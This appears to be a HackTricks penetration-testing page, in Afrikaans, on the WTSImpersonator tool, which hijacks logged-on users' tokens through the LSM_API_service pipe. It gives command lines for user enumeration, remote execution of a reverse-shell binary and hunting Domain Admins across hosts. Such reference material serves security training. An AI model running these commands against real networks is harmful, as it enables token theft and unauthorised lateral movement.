# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

Die **WTS Impersonator**-tool buit die **"\\pipe\LSM_API_service"** RPC Named pipe uit om aangemelde gebruikers diskreet te enumeriseer en hul tokens te kaap, waardeur tradisionele Token Impersonation-tegnieke omseil word. Hierdie benadering fasiliteer naatlose laterale bewegings binne netwerke. Die innovasie agter hierdie tegniek word aan **Omri Baso toegeskryf, wie se werk op [GitHub](https://github.com/OmriBaso/WTSImpersonator) beskikbaar is**.<sup>[[1]](#references)</sup>

### Kernfunksionaliteit

Die tool werk deur middel van ’n reeks API calls:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Sleutelmodules en Gebruik

- **Enumerating Users**: Plaaslike en afgeleë user enumeration is met die tool moontlik deur commands vir enige scenario te gebruik:

- Plaaslik:
```bash
.\WTSImpersonator.exe -m enum
```
- Afgeleë, deur 'n IP-adres of hostname te spesifiseer:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: Die `exec`- en `exec-remote`-modules vereis 'n **Service**-konteks om te funksioneer. Plaaslike uitvoering benodig slegs die WTSImpersonator executable en 'n command:

- Voorbeeld van plaaslike command execution:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe kan gebruik word om 'n Service-konteks te verkry:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: Behels die skep en installering van 'n Service op afstand, soortgelyk aan PsExec.exe, wat uitvoering met die toepaslike permissions moontlik maak.

- Voorbeeld van remote execution:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: Teiken spesifieke users oor verskeie machines en voer code onder hul credentials uit. Dit is veral nuttig om Domain Admins te teiken wat local admin-regte op verskeie systems het.
- Gebruiksvoorbeeld:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## Verwysings

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
